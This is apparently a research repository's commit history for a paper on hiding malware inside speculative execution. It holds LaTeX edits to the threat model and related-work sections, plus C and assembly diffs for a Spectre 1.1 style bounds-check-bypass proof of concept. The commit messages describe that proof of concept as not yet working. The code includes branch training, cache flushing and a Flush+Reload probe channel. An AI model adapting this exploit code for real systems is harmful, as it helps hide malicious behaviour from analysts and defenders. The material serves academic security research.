--- 2018-05-08 paper/paper.tex
@@
-\documentclass[sigconf, anonymous]{acmart}
+\documentclass[conference]{IEEEtran}
 
@@
 \usepackage{siunitx}
+\usepackage{balance}
+\usepackage{graphicx}
 
@@
 
-\fancyhf{} % Remove fancy page headers 
-\fancyhead[C]{Paper \#XXX} % TODO: replace 9999 with your paper number
-\fancyfoot[C]{\thepage}
+% \fancyhf{} % Remove fancy page headers 
+% \fancyhead[C]{Paper \#629} % TODO: replace 9999 with your paper number
+% \fancyfoot[C]{\thepage}
 
-\setcopyright{none} % No copyright notice required for submissions
-%\acmConference[Anonymous Submission to ACM CCS 2018]{ACM Conference on Computer and Communications Security}{Due 08 May 2018}{Toronto, Canada}
-\acmYear{2018}
+% \setcopyright{none} % No copyright notice required for submissions
+% %\acmConference[Anonymous Submission to ACM CCS 2018]{ACM Conference on Computer and Communications Security}{Due 08 May 2018}{Toronto, Canada}
+% \acmYear{2018}
 
-\settopmatter{printacmref=false, printccs=true, printfolios=true} % We want page numbers on submissions
+% \settopmatter{printacmref=false, printccs=true, printfolios=true} % We want page numbers on submissions
 
@@
 \title{\speculake: Hiding Malware in Speculative Execution} % TODO: replace with your title
+\author{\IEEEauthorblockN{Anonymized for Review}
+% \IEEEauthorblockA{Georgia Institute of Technology\\
+% someemail@somedomain.com}
+% \and
+% \IEEEauthorblockN{Homer Simpson}
+% \IEEEauthorblockA{Twentieth Century Fox\\
+% homer@thesimpsons.com}
+% \and
+% \IEEEauthorblockN{James Kirk\\ and Montgomery Scott}
+% \IEEEauthorblockA{Starfleet Academy\\
+% someemail@somedomain.com}
+}
 
-\input{abstract.tex}
+\IEEEoverridecommandlockouts
+\makeatletter\def\@IEEEpubidpullup{9\baselineskip}\makeatother
+\IEEEpubid{\parbox{\columnwidth}{Permission to freely reproduce all or part
+    of this paper for noncommercial purposes is granted provided that
+    copies bear this notice and the full citation on the first
+    page. Reproduction for commercial purposes is strictly prohibited
+    without the prior written consent of the Internet Society, the
+    first-named author (for reproduction of an entire paper only), and
+    the author's employer if the paper was prepared within the scope
+    of employment.
+}
+\hspace{\columnsep}\makebox[\columnwidth]{}}
 
@@
 
-\keywords{Malware; Covert Channel; Weird Machines; TK} % TODO: replace with your keywords
+% \keywords{Malware; Covert Channel; Weird Machines; Spectre} % TODO: replace with your keywords
 
 \maketitle
+\input{abstract}
 
@@
 
-\bibliographystyle{ACM-Reference-Format}
+\bibliographystyle{IEEEtranS}
 \bibliography{paper}

### 2018-07-27 paper/architecture.tex
first cut at threat model

@@
 payload program.
+
+\subsection{Threat Model}
+
+We assume a scenario where an adversary wishes to hide or obscure the behavior
+of a malicious program (malware) from an analyst attempting to reverse engineer
+it. We note this is distinct from the goals of evading malware detection, where
+maleware escapes classification by an anti-virus or other automated tool. While
+we believe \speculake could also be used to make automated detection more
+difficult, our main focus is on reverse engineer resistance, useful for evading
+manual classification concerned with malware behavior. For anti-virus evasion,
+we refer the reader to several existing techniques that are sufficient to defeat
+existing anti-virus
+systems~\cite{jana2012abusing,oberheide2009polypack,ropinjector,swinnen2014one}.
+
+We assume the adversary is able to install binaries on the target machine
+(e.g. via a trojan or remote exploitation), and the analyst is attempting to
+determine what the malware will do using traditional debugging tools. We assume
+the analyst may be aware that speculative execution is used to obfuscate
+behavior, but does not have special-purpose hardware that allows introspection of
+the CPU's speculative state. This assumption is realistic, as modern processors
+do not allow developers or other users to directly interact with proprietary CPU
+optimizations and features.
+
+We further assume that the malware has a specific trigger that the analyst is
+not privy to. In our examples, this trigger is often behavior exhibited by some
+other (potentially benign) process running on the same system as the malware.
+As the adversary is able to control when such a trigger is deployed (potentially
+remotely), the analyst will not be able to observe or force this trigger to
+happen at will. We emphasize that while this may also be true for existing
+trigger-based malware, analysts can often reverse engineer the trigger out of
+the malware, for example by observing control flow within the malware and using
+adaptive fuzzers~\cite{afl} to generate inputs that explore other execution
+paths of the binary. In contrast, \speculake malware's trigger depends on
+behavior in seemingly unrelated binaries, influencing malware behavior through
+channels invisible to the analyst. As with typical malware, the analyst may
+attempt to reverse engineer the trigger to revela the malware's behavior, but we
+will show (in Section~\ref{subsec:nested-spec}) how to defeat this type of
+analysis.
 

### 2018-07-30 paper/architecture.tex
n to m dash

@@
 As shown in Figure~\ref{fig:spec-capacity}, speculative environments can
-complete a significant number of AES rounds -- more than enough to decrypt a
+complete a significant number of AES rounds---more than enough to decrypt a
 full block using AES-CBC. We investigate the use of AES instructions in the

### 2018-07-30 paper/related-work.tex
pass on weird machines

@@
 
-\subsection{Weird Machines \& Red-Pills}
+\subsection{Weird Machines}
 
-%Hardware side effects often leave behind unexpected state transitions 
-%that are not, or cannot be, accounted for in modeling environments. Malware
-%has historically made use of these bugs to create "weird" models of 
-%computation~\cite{weird_machines}. These state transitions can also leak 
-%information about the environment in which a program is running, which 
-%malware has used to detect honey-pots and emulated 
-%environments~\cite{balzarotti2010efficient}.
+\speculake is a \textit{weird machine}---a machine which executes arbitrary
+computation using unintended executions paths, often the result of bugs or
+attacker exploits~\cite{weird_machines,bratus2011exploit,weird_exploits}. In
+particular \speculake takes advantage of speculative execution and a separate
+trigger program to execute otherwise dead code.
 
-\textit{Weird machines} are machines composing bugs and features of a system to
-create arbitrary computation with interesting
-properties~\cite{weird_machines,bratus2011exploit,weird_exploits}. This
-encompasses many traditional computer vulnerabilities~\cite{buffer_overflow,
-format_string_exploit, shacham2007geometry}. These exploits demonstrate
-performing arbitrary computation in places that were not originally intended to
-act as computational entities.
+Previous weird machines have demonstrated many traditional computer
+vulnerabilities such as buffer overflows, format string exploits and
+return-to-libc attacks without function calls~\cite{buffer_overflow,
+format_string_exploit, shacham2007geometry}.
 
-Unexpected functionality such as~\cite{bangert2013page} is abundant in modern
-processors~\cite{d2015exploiting} as multiple threads share system resources
-cooperatively and optimizations are often done across the process
-isolation boundary. \speculake takes advantage of cooperative hardware
-resources, and constructs a hardware weird machine
-using speculative branching and \texttt{Flush+Reload}.
+Additionally, unexpected functionality such as instruction-less
+computing~\cite{bangert2013page} enables the demonstration of a Turing complete
+weird machine by taking advantage of memory translation tables, page-faults, and
+hardware exception handling to effectively compute arithmetic and logical
+operations without the processor executing any instructions.
 
+These types of machines are abundant in modern processors~\cite{d2015exploiting}
+as multiple threads share system resources cooperatively and optimizations are
+often done across the process isolation boundary.
+
+Whereas previous weird machines have demonstrated the capability to execute
+potentially malicious code in an unexpected manner, \speculake showcases the
+ability to execute dead code within the speculative world.
+
+\subsection{Red-Pills}
 Hardware minutia have also been used to identify and fingerprint execution

### 2018-07-30 spectre_1/measure.c
Spectre 1.1 version overflow working, speculative overflow not working

@@ -1,0 +1,200 @@
+#include <stdio.h>
+#include <stdbool.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <x86intrin.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/mman.h>
+#include "signal.h"
+
+
+#define MAX_ITERATIONS 2000
+
+/*
+ * Target gadget  never called directly (essentially dead code)
+ * However, "inject" (ideally) trains the processor to think the indirect ret in the
+ * retpoline in measure is going to call this function
+ */
+#define TARGET_FN_ADDR 0x414100401000
+void target_fn(void) __attribute__((section(".targetfn")));
+void end_target_fn(void);
+
+// Use Global instead of local for easier flushing?
+int max_len = 12;
+
+/*
+ * Defines the bandwidth we can communicate from speculative -> von neuman
+ * e.g. 256 would be 1 byte of info Tradeoff here is larger bandwidth means 
+ * we have to check more places in probe_buf (and flush them)
+ */
+#define NUM_PROBES 1024
+
+/*
+ * These define the stride length we take between probes. This thwarts a 
+ * clever CPU's stride prediction (e.g. "you loaded buf[0], buf[1024], 
+ * I'll load buf[2048] for you") Generally, this results in not seeing ANY 
+ * winning probes in which case, we change cur_probe_space and retry.
+ */
+#define MAX_PROBE_SPACE (1000003)
+
+/*
+ * The (heap-allocated) probe buffer
+ * We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
+ * in the cache to communicate the value i from speculative -> von neuman
+ */
+uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
+uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
+
+static inline __attribute__((always_inline)) void flush_probe_buf_i(){
+    // Clear probe_buf from cache
+    int j =0;
+    for (j=0; j<NUM_PROBES; j++) {
+        _mm_clflush(&probe_buf[j*cur_probe_space]);
+    }
+}
+
+void flush_probe_buf(){
+    // Clear probe_buf from cache
+	flush_probe_buf_i();
+}
+
+
+// Stats
[…]

### 2018-07-30 spectre_1/signal.c

@@ -1,0 +1,134 @@
+#include <stdio.h>
+#include "signal.h"
+
+inline void signal(uint64_t state){
+    asm volatile ("mov (%%rcx), %%rax" :: "c"(&probe_buf[state*cur_probe_space]) : "rax");
+}
+
+
+inline void signal32(uint32_t state){
+    uint32_t a, b, c, d;
+    a = state & 0xFF;
+    b = state>>8 & 0xFF | 0x100;
+    c = state>>16 & 0xFF| 0x200;
+    d = state>>24 & 0xFF| 0x300;
+    asm volatile (
+        "mov (%0), %%rax\n" 
+        "mov (%1), %%rbx\n" 
+        "mov (%2), %%rcx\n" 
+        "mov (%3), %%rdx\n" 
+        ::  "r"(&probe_buf[a*cur_probe_space]),
+            "r"(&probe_buf[b*cur_probe_space]), 
+            "r"(&probe_buf[c*cur_probe_space]),
+            "r"(&probe_buf[d*cur_probe_space]) : "rax", "rbx", "rcx", "rdx");
+}
+
+
+inline void signal40(uint64_t state){
+    uint32_t a, b, c, d, e, f, g, h;
+    a = state & 0x1F;
+    b = state>>0x05 & 0x1F | 0x20;
+    c = state>>0x0A & 0x1F | 0x40;
+    d = state>>0x0F & 0x1F | 0x60;
+    e = state>>0x14 & 0x1F | 0x80;
+    f = state>>0x19 & 0x1F | 0xA0;
+    g = state>>0x1E & 0x1F | 0xC0;
+    h = state>>0x23 & 0x1F | 0xE0;
+    asm volatile (
+        "mov (%0), %%rax\n" 
+        "mov (%1), %%rbx\n" 
+        "mov (%2), %%rcx\n" 
+        "mov (%3), %%rdx\n" 
+        "mov (%4), %%rsi\n" 
+        "mov (%5), %%rdi\n" 
+        "mov (%6), %%r8\n" 
+        "mov (%7), %%r9\n" 
+        ::  "r"(&probe_buf[a*cur_probe_space]),
+            "r"(&probe_buf[b*cur_probe_space]), 
+            "r"(&probe_buf[c*cur_probe_space]),
+            "r"(&probe_buf[d*cur_probe_space]),
+            "r"(&probe_buf[e*cur_probe_space]),
+            "r"(&probe_buf[f*cur_probe_space]),
[…]

### 2018-07-30 spectre_1/signal.h

@@ -1,0 +1,41 @@
+#include <stdint.h>
+#include <stdbool.h>
+#include "stringify.h"
+
+
+#define __SIGNAL(val, reg1, reg2, reg3)     \
+        movq $(val), reg2;                     \
+        mov (cur_probe_space), reg1;        \
+        imul reg2;                          \
+        mov (probe_buf), reg3;              \
+        add reg1, reg3;                     \
+        mov (reg3), reg1;
+
+#define __signal(value) \
+        __stringify(__SIGNAL(value, %%r10, %%r11, %%r12))
+
+extern uint8_t* probe_buf;
+extern uint64_t cur_probe_space;
+#define NUM_PROBES 1024
+
+/*
+ * Find the K items in results that have been hit the most often
+ */
+bool get_top_k(uint64_t k, uint64_t* results, uint64_t* output_i, uint64_t* output_res, 
+               const int MAX_ITERATIONS);
+
+/*
+ * Signal32 will use a bitmask on the upper part of each item in the 
+ * Top-K items to identify where it goes in the final result. This 
+ * reconstructs that result by identifying the bitmasks.
+ */
+uint64_t construct_result(uint64_t k, uint64_t width, uint64_t* top_k);
+
+
+void signal(uint64_t state);
+
+void signal32(uint32_t state);
+
+void signal40(uint64_t state);
+
+

### 2018-07-30 spectre_1/target_fn.c

@@ -1,0 +1,34 @@
+#include <unistd.h>
+#include <stdint.h>
+#include <stdio.h>
+#include "signal.h"
+
+extern uint8_t *probe_buf;
+extern uint64_t cur_probe_space;
+extern uint64_t signal_idx;
+
+uint64_t try_decrypt(void);
+__uint128_t aes_ctr(uint64_t ctr);
+
+extern uint8_t *turing_tape;
+extern uint8_t turing_state;
+
+void target_fn(void) __attribute__((section(".targetfn")));
+void target_fn(void)
+{
+    asm volatile (
+        ".rept 0x6; nop; .endr\n"
+    "target_fn_start:"
+
+        ".rept 32\n"
+        __signal(0x66)
+        "nop;nop;nop;nop;nop;nop\n" // cover (pop %rax; call 1f;)
+        
+        ".endr\n"
+        :::"rax", "rcx", "rdx");  
+}
+
+void end_target_fn(void) __attribute__((section(".targetfn")));
+void end_target_fn(void) {
+}
+

### 2018-07-30 paper/related-work.tex
pass on red-pills

@@
 % Hardware bare-metal analysis
-To combat this Kirat~\textit{et al.} propose automated ``bare-metal''
-emulation of malware~\cite{kirat2011barebox}, and methods to determine if malware
-is performing red-pill checks to avoid emulation environments~\cite{kirat2014barecloud}.
-Symbolic execution can also be used to combat red-pills by finding environmental triggers 
-in malicious binaries~\cite{schwartz2010all}.
 
-Unlike other red-pills based on hardware bugs, \speculake cannot be bypassed
-by patching binaries as the speculation will only occur on bare-metal systems, 
-and the critical functionality is performed speculatively. Similarly, debugging 
-break-points will not be triggered as instructions are never completed in a committed state.
-Symbolic execution will also fail to find the speculative gadgets as it is never on the
-execution pathway.
+``Bare-metal'' emulation of malware~\cite{kirat2011barebox}, methods to
+determine if malware is performing red-pill checks to avoid emulation
+environments~\cite{kirat2014barecloud}, and symbolic execution can also be used
+to combat red-pills by finding environmental triggers in malicious
+binaries~\cite{schwartz2010all}.
+
+Unlike other red-pills, \speculake confounds analysts and red-pill detectors
+with the use a trigger program and speculative execution. The use of a separate
+and benign trigger program controlled by the adversary enables the \speculake
+malware to limit detection capabilities. Additionally, as \speculake is executed
+via speculative execution, the instructions executed and speculative state are 
+also obscured from analysts.
+
+Similarly, debugging break-points will not enable analysts to debug \speculake
+malware as break-points interrupt the control flow of a program and prevent
+speculative execution. Symbolic execution will also fail to find the speculative
+gadgets as it is never on the execution pathway. This allows \speculake to
+effectively act as a red-pill while avoiding detection as such.
 

### 2018-07-30 spectre_1/measure.c
larger array, memcpy, and working overflow -- not working speculatively

@@ -20,8 +20,6 @@
 void target_fn(void) __attribute__((section(".targetfn")));
 void end_target_fn(void);
 
-// Use Global instead of local for easier flushing?
-int max_len = 12;
 
 /*
  * Defines the bandwidth we can communicate from speculative -> von neuman
@@ -98,16 +96,14 @@ void check_probes() {
     flush_probe_buf();
 }
 
+// Use Global instead of local for easier flushing?
+int max_len = 101;
 
 void branch(char* str, int len){
-    char local_str[12]= {
-            0x88,0x88,0x88,0x88,0x88,0x88,
-            0x88,0x88,0x88,0x88,0x88,0x88};
-
-    _mm_clflush(&max_len);
+    char local_str[101];
 
     if (len < max_len){
-        strcpy(local_str, str);
+        memcpy(local_str, str, len);
         return;
     } 
     return;
@@ -122,14 +118,26 @@ void train_branch(){
     }
 }
 
+/*
+ * The Address of target_fn is set in linker.ld to be 0x0000000000434040
+ * since these buffers will be aligned on the stack, just overwrite the 
+ * same thing everwhere, as this should happen speculatively and never 
+ * actually write onto stack.
+ */
 void trick_branch(){
-    char overflow[36] = {
-            0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,
-            0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,
-            0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,
-            0x44,0x44,0x44,0x44,0x40,0x40,0x43,0x00
-        };
-    branch(overflow, 36);
+    int i;
+    char overflow[136];
+    for (i=0; i<136/8; i++) {
+        overflow[i*8+0]=0x40;
+        overflow[i*8+1]=0x40;
+        overflow[i*8+2]=0x43;
+        overflow[i*8+3]=0x00;
+        overflow[i*8+4]=0x00;
+        overflow[i*8+5]=0x00;
+        overflow[i*8+6]=0x00;
+        overflow[i*8+7]=0x00;
+    }
+    branch(overflow, 136);
 }
 
 void measure() {
@@ -148,6 +156,7 @@ void measure() {
             
             train_branch();
             flush_probe_buf_i();
+            _mm_clflush(&max_len);
             trick_branch();
             
         }

### 2018-07-31 spectre_1/measure.c
should be working spectre1.2, but isn't

@@ -21,7 +21,7 @@ void target_fn(void) __attribute__((section(".targetfn")));
 void end_target_fn(void);
 
 // Use Global instead of local for easier flushing?
-int max_len = 12;
+int __attribute__((section(".max_len"))) max_len = 101;
 
 /*
  * Defines the bandwidth we can communicate from speculative -> von neuman
@@ -36,7 +36,7 @@ int max_len = 12;
  * I'll load buf[2048] for you") Generally, this results in not seeing ANY 
  * winning probes in which case, we change cur_probe_space and retry.
  */
-#define MAX_PROBE_SPACE (1000003)
+#define MAX_PROBE_SPACE (10003)
 
 /*
  * The (heap-allocated) probe buffer
@@ -81,7 +81,8 @@ void check_probes() {
 
     int i, mix_i;
     for (i=0; i<NUM_PROBES; i++) {
-		mix_i = ((i* 167) +13) & NUM_PROBES-1;
+        //mix_i = ((i* 167) +13) & NUM_PROBES-1;
+        mix_i = i;
         addr = &probe_buf[mix_i*cur_probe_space];
         t0 = _rdtscp(&junk);
         asm volatile( "movb (%%rbx), %%al\n"
@@ -98,45 +99,46 @@ void check_probes() {
     flush_probe_buf();
 }
 
-
 void branch(char* str, int len){
-    char local_str[12]= {
-            0x88,0x88,0x88,0x88,0x88,0x88,
-            0x88,0x88,0x88,0x88,0x88,0x88};
+    char local_str[101];
 
-    _mm_clflush(&max_len);
 
     if (len < max_len){
-        strcpy(local_str, str);
+        register i;
+        for (i=0; i<len; i++) {
+            local_str[i] = str[i];
+        }
+        //memcpy(local_str, str, len);
         return;
-    } 
+    }
     return;
 }
 
-void train_branch(){    
+void train_branch(){
     int i =0;
-    int training_rounds = 200; 
-    
+    int training_rounds = 2000;
+    char buf[80];
+
+    memset(buf, 'A', 80);
+
     for (i=0; i< training_rounds; i++){
-        branch("Plain", 5);
+        branch(buf, 80);
     }
 }
 
 void trick_branch(){
-    char overflow[36] = {
-            0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,
-            0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,
[…]

### 2018-07-31 spectre_1/signal.c

@@ -54,7 +54,6 @@ inline void signal40(uint64_t state){
          : "rax", "rbx", "rcx", "rdx");
 }
 
-
 /*
  * Find the K items in results that have been hit the most often
  */
@@ -63,7 +62,7 @@ bool get_top_k(uint64_t k, uint64_t* results, uint64_t* output_i, uint64_t* outp
     uint64_t top_k[k];
     uint64_t top_k_res[k];
     uint64_t min_i=0;
-    uint64_t min_hits_allowed=0;
+    uint64_t min_hits_allowed=1;
     uint64_t hits=0;
 
     uint64_t i, j, x;

### 2018-07-31 spectre_1/signal.h

@@ -6,13 +6,13 @@
 #define __SIGNAL(val, reg1, reg2, reg3)     \
         movq $(val), reg2;                     \
         mov (cur_probe_space), reg1;        \
-        imul reg2;                          \
+        imul reg1, reg2;                          \
         mov (probe_buf), reg3;              \
-        add reg1, reg3;                     \
+        add reg2, reg3;                     \
         mov (reg3), reg1;
 
 #define __signal(value) \
-        __stringify(__SIGNAL(value, %%r10, %%r11, %%r12))
+        __stringify(__SIGNAL(value, %%rax, %%rcx, %%rdx))
 
 extern uint8_t* probe_buf;
 extern uint64_t cur_probe_space;

### 2018-07-31 spectre_1/target_fn.c

@@ -16,16 +16,19 @@ extern uint8_t turing_state;
 void target_fn(void) __attribute__((section(".targetfn")));
 void target_fn(void)
 {
+    //printf("target_fn\n");
     asm volatile (
-        ".rept 0x6; nop; .endr\n"
+        //".rept 0x6; nop; .endr\n"
     "target_fn_start:"
 
         ".rept 32\n"
-        __signal(0x66)
-        "nop;nop;nop;nop;nop;nop\n" // cover (pop %rax; call 1f;)
-        
+        __signal(0x11)
+        //"nop;nop;nop;nop;nop;nop\n" // cover (pop %rax; call 1f;)
+
         ".endr\n"
-        :::"rax", "rcx", "rdx");  
+        :::"rax", "rcx", "rdx");
+
+    //asm volatile ("pop %%rbp\npush $0x0400892\nretq\n":::);
 }
 
 void end_target_fn(void) __attribute__((section(".targetfn")));

### 2018-07-31 spectre_1/measure.c
remix i

@@ -81,8 +81,8 @@ void check_probes() {
 
     int i, mix_i;
     for (i=0; i<NUM_PROBES; i++) {
-        //mix_i = ((i* 167) +13) & NUM_PROBES-1;
-        mix_i = i;
+        mix_i = ((i* 167) +13) & NUM_PROBES-1;
+        //mix_i = i;
         addr = &probe_buf[mix_i*cur_probe_space];
         t0 = _rdtscp(&junk);
         asm volatile( "movb (%%rbx), %%al\n"

### 2018-07-31 paper/related-work.tex
pass on covert channels

@@
 
-\subsection{Cache Side Channels}
+\subsection{Covert Channels}
 
-Cache side-channels have been used against a number of processors at essentially
-all different caching levels---L1 data
-cache~\cite{percival2005cache,zhang2012cross,osvik2006cache}, L1 instruction
-cache~\cite{aciiccmez2010new}, L2
-cache~\cite{ristenpart2009hey,percival2005cache},
-LLC~\cite{ristenpart2009hey,liu2015last}, and branch prediction
-cache~\cite{aciiccmez2007power}. These attacks have also been performed in the
-cloud~\cite{ristenpart2009hey,zhang2012cross},
-browser~\cite{oren2015spy,google_cache_browser}, and security critical
-encryption~\cite{yarom2014recovering,tromer2010efficient} environments,
-demonstrating how ubiquitous hardware side-channel exploits can be.
+There is a plethora of previous research into cache side-channels, examining how
+information is leaked between
+processes~\cite{percival2005cache,zhang2012cross,osvik2006cache}. This is a key
+feature of Spectre~\cite{spectre} and Meltdown~\cite{meltdown}. In \speculake we
+use the branch predictor side-channel as a \emph{covert
+channel}~\cite{lampson1973note} between an innocent victim program and malware.
+This allows \speculake to use the leaked information from cache as a message to
+a colluding malware to make decisions.
 
-Cache side channels come in many
-variants~\cite{neve2006refined,tromer2010efficient,yarom2014flush+,gruss2016flush+flush}.
-In \speculake, we utilize the \texttt{Flush+Reload} method, where we first flush
-all items from cache, wait for the speculative world to reload a value, and then
-time accesses to reloading each potential value. However, we acknowledge that
-the recent \texttt{Flush+Flush} variant may offer a faster
-alternative~\cite{gruss2016flush+flush}.
+Previous work has examined various ways of sharing information over covert
+channels, such as across virtualized environments on cloud
+systems~\cite{wu2012whispers}, using L1 and L2 cache to share
+information~\cite{percival2005cache}, measuring temperature to create a thermal
+covert channel~\cite{masti2015thermal, bartolini2016capacity} and taking
+advantage of processor architecture to leak information~\cite{wang2006covert}.
 
-%\begin{itemize}
-%\item \texttt{Evict+Time} - An attacker with a synchronized clock evicts a series of items 
-%from cache. The victim then proceeds with computation, at which point the attacker can 
-%time accesses to each evicted item to identify which items a victim loaded~\cite{neve2006refined}. 
-%\item \texttt{Prime+Probe} - An attaker performs a computation, then evicts specific 
-%items from the cache before performing the same action again. Information about the cache
-%access patterns can be gained by comparing the timimg of the two 
-%computations~\cite{tromer2010efficient}.
-%\item \texttt{Flush+Reload} - Two cooperating processes  make use of the \texttt{Evict+Time} 
-%model to form a communication channel~\cite{yarom2014flush+}.
-%\item \texttt{Flush+Flush} - Follows the same model as \texttt{Prime+Probe},
-%however clflush is used instead of a load as it resolves much quicker in cases 
-%where the item is not in cache~\cite{gruss2016flush+flush}.
-%\end{itemize}
+The branch predictor has been used as a covert
+channel~\cite{evtyushkin2016understanding}. Previous work has examined the
+capability of two colluding programs to share sensitive information between each
+other using the branch predictor by timing how long a spy process executes taken
+(not-taken) branches~\cite{evtyushkin2015covert}.
 
-%While other works have demonstrated higher throughput from similar 
-%covert cache side channels~\cite{liu2015last}, \speculake incurrs slightly higher performance 
-%penalties in our implementation as we perform redundancy checks to 
-%ensure the signal strength.  This redundancy combined with the intentional cache misseses
-%which enable speculative execution cost hundreds to thousands of clock cycles
-%per round.
+\speculake takes advantage of a cache side-channel in \texttt{OpenSSL} and uses
+it as a covert channel. \texttt{OpenSSL} is not a malicious colluding program in
+this case but rather a program leaking information on which cipher suite has
+been selected by attackers, allowing us to use the branch predictor as an
+attacker controlled covert channel of an innocent victim program.
+
+% cache~\cite{aciiccmez2010new}, L2
+% cache~\cite{ristenpart2009hey,percival2005cache},
+% LLC~\cite{ristenpart2009hey,liu2015last}, and branch prediction
+% cache~\cite{aciiccmez2007power}. These attacks have also been performed in the
+% cloud~\cite{ristenpart2009hey,zhang2012cross},
+% browser~\cite{oren2015spy,google_cache_browser}, and security critical
+% encryption~\cite{yarom2014recovering,tromer2010efficient} environments,
+% demonstrating how ubiquitous hardware side-channel exploits can be.
+
+% Cache side channels come in many
+% variants~\cite{neve2006refined,tromer2010efficient,yarom2014flush+,gruss2016flush+flush}.
+% In \speculake, we utilize the \texttt{Flush+Reload} method, where we first flush
+% all items from cache, wait for the speculative world to reload a value, and then
+% time accesses to reloading each potential value. However, we acknowledge that
+% the recent \texttt{Flush+Flush} variant may offer a faster
+% alternative~\cite{gruss2016flush+flush}.
 

### 2018-08-01 spectre_1/measure.c
Adapted Spectre 1.1 from Listings in MIT paper - still not working

@@ -20,8 +20,6 @@
 void target_fn(void) __attribute__((section(".targetfn")));
 void end_target_fn(void);
 
-// Use Global instead of local for easier flushing?
-int __attribute__((section(".max_len"))) max_len = 101;
 
 /*
  * Defines the bandwidth we can communicate from speculative -> von neuman
@@ -99,45 +97,32 @@ void check_probes() {
     flush_probe_buf();
 }
 
-void branch(char* str, int len){
-    char local_str[101];
 
+// Use Global instead of local for easier flushing?
+int __attribute__((section(".max_len"))) max_len = 43;
 
-    if (len < max_len){
-        register i;
-        for (i=0; i<len; i++) {
-            local_str[i] = str[i];
-        }
-        //memcpy(local_str, str, len);
+void branch(uint64_t* array, uint64_t entry, int index){
+    if (index < max_len){
+        array[index] = entry;
         return;
     }
     return;
 }
 
-void train_branch(){
-    int i =0;
+void trick_branch(){
+    int i=0;
     int training_rounds = 2000;
-    char buf[80];
-
-    memset(buf, 'A', 80);
+    uint64_t overflow[43];
+    uint64_t good_val = 0xDEADBEEF12345678;
+    uint64_t bad_val  = 0x0000000000434040;
 
     for (i=0; i< training_rounds; i++){
-        branch(buf, 80);
+        branch(overflow, good_val, i%43);
     }
-}
+    
+    _mm_clflush(&max_len);
 
-/*
- * The Address of target_fn is set in linker.ld to be 0x0000000000434040
- * since these buffers will be aligned on the stack, just overwrite the 
- * same thing everwhere, as this should happen speculatively and never 
- * actually write onto stack.
- */
-void trick_branch(){
-    char overflow[136];
-    memset(overflow, 0x44, sizeof(overflow));
-    ((uint64_t *)overflow)[(sizeof(overflow)-1)/sizeof(uint64_t)] = 0x0434040;
-
-    branch(overflow, sizeof(overflow));
+    branch(overflow, bad_val, 49);
 }
 
 void measure() {
@@ -154,8 +139,8 @@ void measure() {
     while (1) {
         //flush_probe_buf_i();
         for (i=0; i<MAX_ITERATIONS; i++) {
-            train_branch();
-            _mm_clflush(&max_len);
+            // train_branch();
+            // _mm_clflush(&max_len);
             trick_branch();
             check_probes();
         }

### 2018-08-01 spectre_1/measure.c
signaling in branch

@@ -103,6 +103,7 @@ int __attribute__((section(".max_len"))) max_len = 43;
 
 void branch(uint64_t* array, uint64_t entry, int index){
     if (index < max_len){
+        asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
         array[index] = entry;
         return;
     }
@@ -121,6 +122,7 @@ void trick_branch(){
     }
     
     _mm_clflush(&max_len);
+    flush_probe_buf_i();
 
     branch(overflow, bad_val, 49);
 }
@@ -129,7 +131,7 @@ void measure() {
     int i, j;
 
     int misses = 0;
-    uint64_t k = 1;
+    uint64_t k = 2;
     uint64_t width = 8;
     uint64_t top_k_i[k]; 
     uint64_t top_k_res[k]; 

### 2018-08-01 paper/related-work.tex
second pass on weird machines

@@
 
-\speculake is a \textit{weird machine}---a machine which executes arbitrary
-computation using unintended executions paths, often the result of bugs or
-attacker exploits~\cite{weird_machines,bratus2011exploit,weird_exploits}. In
-particular \speculake takes advantage of speculative execution and a separate
-trigger program to execute otherwise dead code.
+\speculake shares many properties with \textit{weird machines}---a machine which
+take advantage of bugs or unexpected idiosyncracies in existing systems to
+perform arbitrary
+computation~\cite{weird_machines,bratus2011exploit}. In
+particular \speculake showcases the ability to execute dead code.
 
-Previous weird machines have demonstrated many traditional computer
-vulnerabilities such as buffer overflows, format string exploits and
-return-to-libc attacks without function calls~\cite{buffer_overflow,
-format_string_exploit, shacham2007geometry}.
+Previous examples of weird machines include traditional vulnerabilities such as
+buffer overflows, format string exploits and return-to-libc attacks without
+function calls~\cite{buffer_overflow, format_string_exploit,
+shacham2007geometry}.
 
-Additionally, unexpected functionality such as instruction-less
+Unexpected functionality such as instruction-less
 computing~\cite{bangert2013page} enables the demonstration of a Turing complete
@@
 
-These types of machines are abundant in modern processors~\cite{d2015exploiting}
-as multiple threads share system resources cooperatively and optimizations are
-often done across the process isolation boundary.
+Features in modern processors such as multiple threads sharing system resources
+and optimizations done across the process isolation boundary leads to
+opportunities for ``weird machines''~\cite{d2015exploiting}.
 
 Whereas previous weird machines have demonstrated the capability to execute
-potentially malicious code in an unexpected manner, \speculake showcases the
-ability to execute dead code within the speculative world.
+potentially malicious code in an unexpected manner, \speculake is a new type of
+``weird machine'' that takes advantage of speculative execution and uses a
+non-complicit trigger program to execute otherwise dead code.
 

### 2018-08-01 paper/related-work.tex
rewording

@@
 
-Previous examples of weird machines include traditional vulnerabilities such as
-buffer overflows, format string exploits and return-to-libc attacks without
+Previous examples of ``weird machines'' include traditional vulnerabilities such
+as buffer overflows, format string exploits and return-to-libc attacks without
 function calls~\cite{buffer_overflow, format_string_exploit,
@@
 
-Unexpected functionality such as instruction-less
-computing~\cite{bangert2013page} enables the demonstration of a Turing complete
-weird machine by taking advantage of memory translation tables, page-faults, and
-hardware exception handling to effectively compute arithmetic and logical
-operations without the processor executing any instructions.
+Unexpected functionality such as instruction-less computing enables the
+demonstration of a Turing complete weird machine by taking advantage of memory
+translation tables, page-faults, and hardware exception handling to effectively
+compute arithmetic and logical operations without the processor executing any
+instructions~\cite{bangert2013page}.
 
@@
 
-Whereas previous weird machines have demonstrated the capability to execute
-potentially malicious code in an unexpected manner, \speculake is a new type of
-``weird machine'' that takes advantage of speculative execution and uses a
+Previous ``weird machines'' have demonstrated the capability to execute
+potentially malicious code in an unexpected manner, and \speculake is a new type
